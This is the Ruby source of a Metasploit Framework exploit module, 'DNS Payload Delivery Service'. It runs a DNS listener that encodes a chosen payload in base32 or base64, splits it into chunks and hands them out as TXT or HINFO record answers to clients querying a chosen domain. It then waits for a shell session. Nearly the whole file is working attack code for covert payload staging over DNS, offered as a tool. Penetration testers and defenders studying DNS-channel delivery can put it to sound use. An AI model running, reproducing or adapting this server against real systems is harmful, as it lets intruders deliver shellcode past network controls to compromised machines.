##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'resolv'


class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Capture
    include Msf::Auxiliary::Report


    def initialize
        super(
            'Name'        => 'DNS Payload Delivery Service',
            'Version'     => '$Revision$',
            'Description'    => %q{
                This module is designed for out-of-band payload delivery.
                When started this module will create an DNS listener that monitors incoming DNS
                requests for a specified domain. Once a request is received the module will then
                encode the chosen payload and deliver it back to the source of the request as a
                DNS response. Larger payloads will be split amongst a number of sub-domains to keep
                within the size limits of UDP DNS reponses (576 bytes).

                A client-side script of application is required to make use of this module.
                The server-side portion is made available to allow further research into
                alternative shellcode delivery mechanisms.
            },
            'Author'      => 'Chris John Riley',
            'License'     => MSF_LICENSE,
            'References'    =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc']
                ],
            'Payload'        =>
                    {
                            'Space'       => 1400,
                            'BadChars'    => '',
                            'DisableNops' => true,
                    },
            'Platform'       => [ 'win', 'linux', 'solaris', 'unix', 'osx', 'bsd', 'php', 'java' ],
            'Arch'           => ARCH_ALL,
            'Targets'        => [ [ 'Wildcard Target', { } ] ],
            'DefaultTarget'  => 0
        )

        register_options(
            [
                OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
                OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 53 ]),
                OptString.new('DOMAIN',     [ true, "The domain name to resolve (sub-domains will be created", '*' ]),
                OptString.new('ENCODING',   [ true, 'Specify base32/base64 encoding', 'base32' ]),
                OptString.new('PREFIX',     [ false, 'Prepend value to shellcode delivery', 'SC' ]),
                OptString.new('PREFIX_NUM', [ false, 'Assign numbers after prefix', true]),
            ], self.class)

        register_advanced_options(
            [
                OptBool.new("ExitOnSession", [ false, "Return from the exploit after a session has been created", true ]),
                OptBool.new("ALLOW_PASSTHRU", [true, "Allow A record requests to be passed on to be resolved", true]),
            ], self.class)

        deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
    end


    def exploit

        if not datastore['ExitOnSession'] and not job_id
            raise RuntimeError, "#{name}: Setting ExitOnSession to false requires running as a job (exploit -j)"
        end

        begin
            @port = datastore['SRVPORT'].to_i
            @host = datastore['SRVHOST']

            @domain = datastore['DOMAIN']
            @prefix = datastore['PREFIX']
            @prefix_num = datastore['PREFIX_NUM']
            @encoding = datastore['ENCODING'].downcase

            print_status("#{name}: Monitoring requests for subdomains of %s" % @domain)
            # create and split up payload
            splitpayload

            # start listner
            print_status("#{name}: Starting DNS Server on %s:%s" % [@host, @port])
            dnslistener

        rescue  =>  ex
            print_error(ex.message)
        ensure
            print_status("#{name}: Stopping DNS Server on %s:%s" % [@host, @port])
        end
    end

    def dnslistener

        # MacOS X workaround
        ::Socket.do_not_reverse_lookup = true

        @sock = ::UDPSocket.new()
        @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
        @sock.bind(@host, @port)

        print_status("#{name}: DNS server started")

        begin
            while true
                packet, addr = @sock.recvfrom(65535)
                break if packet.length == 0

                request = Resolv::DNS::Message.decode(packet)
                @answer = Resolv::DNS::Message::new(request.id)
                @answer.qr = 1
                @answer.aa = 1
                @answer.opcode = request.opcode
                @answer.rd = request.rd
                @answer.ra = 0
                @answer.rcode = 0
                ttl = 16000
                reply = false

                request.each_question {|hname, typeclass|
                    reply = false
                    @hname = hname.to_s
                    @record_type = typeclass.name.split("::").last

                if datastore['VERBOSE']
                    print_status("DNS: #{addr[3]}:#{addr[1]} ID: #{request.id} HOSTNAME: #{@hname} TYPE: #{@record_type}")
                end

                    case @record_type
                    when 'TXT'
                        if @hname.ends_with?("." + @domain)
                            @answer.add_answer(@hname + ".", ttl, Resolv::DNS::Resource::IN::TXT.new(@enc_payload.pop))
                            @answer.encode
                            print_good("#{name}: Delivering payload section %d via #{@record_type.to_s} record answer" % [@split_payload.length - @enc_payload.length])
                            reply = true
                        else
                            print_debug("Ignoring request for %s as it's not in scope (*.%s)" % [@hname, @domain]) if datastore['VERBOSE']
                        end
                    when 'HINFO'
                        if @hname.ends_with?("." + @domain)
                            @answer.add_answer(@hname + ".", ttl, Resolv::DNS::Resource::IN::HINFO.new(@enc_payload.pop, ''))
                            @answer.encode
                            print_good("#{name}: Delivering payload section %d via #{@record_type.to_s} record answer" % [@split_payload.length - @enc_payload.length])
                            reply = true
                        else
                            print_debug("Ignoring request for %s as it's not in scope (*.%s)" % [@hname, @domain]) if datastore['VERBOSE']
                        end
                    when 'A'
                        # pass thu lookup to another DNS server
                        if datastore['ALLOW_PASSTHRU']
                            resolv = pass_thru_lookup
                            reply = true if not resolv == 0
                        else
                            next
                        end
                    else
                        print_error("#{name}: Unsupported record type %s" % @record_type)
                    end
                }

                if reply
                    @sock.send(@answer.encode, 0, addr[3], addr[1])
                end

                if @enc_payload.length == 0
                    print_status("#{name}: All %d sections of shellcode delivered, waiting for session" % @split_payload.length)
                    if datastore['ExitOnSession'] and not job_id
                        if session_created?
                            return
                        else
                            select(nil,nil,nil,3)
                            return if session_created?
                        end
                        print_error("#{name}: No session created - Ending")
                        return
                    elsif not datastore['ExitOnSession'] or job_id
                        print_status("#{name}: Running as background job - Creating new payload")
                        splitpayload
                    end
                end
            end

        rescue ::Exception => e
            print_error("#{name}: #{e.class} #{e}")
        # Make sure the socket gets closed on exit
        ensure
            @sock.close
        end
    end

    def pass_thru_lookup
        print_debug("#{name}: Passing #{@hname} on to be resolved") if datastore['VERBOSE']

        begin
            ip = Resolv::DNS.new().getaddress(@hname).to_s
            resolv = Resolv::DNS::Resource::IN::A.new( ip )
            print_debug("#{name}: DNS bypass domain #{@hname} resolved #{ip}") if datastore['VERBOSE']
            @answer.add_answer(@hname, 60, resolv)
            @answer.encode
        rescue
            print_debug("#{name}: DNS bypass domain #{@hname} unable to resolve") if datastore['VERBOSE']
            resolv = 0
        end
        return resolv
    end

    def encodepayload
        # encode payload into Base64/Base32 as required

        p = payload.encoded
        if @encoding == 'base64'
            enc_payload = Rex::Text.encode_base64(p)
            print_status("#{name}: Encoding payload using base64")
            return enc_payload
        elsif @encoding == 'base32'
            enc_payload = Rex::Text.encode_base32(p)
            print_status("#{name}: Encoding payload using base32")
            return enc_payload
        else
            raise RuntimeError , "Invalid encoding type"
        end
    end

    def splitpayload
        # split into chunks for delivery
        payload_size = 250 - @prefix.length
        tosplit = encodepayload
        @split_payload = []
        start = 0
        while start < tosplit.length
            @split_payload << tosplit[start..start+payload_size-1]
            start = start + payload_size
        end
        print_status("#{name}: Splitting payload into %d chunks" % @split_payload.length)
        @enc_payload = []
        if @prefix_num
            num = 0
            @split_payload.each do | epay |
                @enc_payload << @prefix.to_s + num.to_s + epay
                num = num+1
            end
        else
            @split_payload.each do | epay |
                @enc_payload << @prefix.to_s + epay
            end
        end

        if datastore['VERBOSE']
            i=1
            @enc_payload.each do | shellcode |
                print_debug("#{name}: Split payload (Section %d) ::: \n%s" % [i, shellcode])
                i = i +1
            end
        end

        @enc_payload.reverse!

    end
end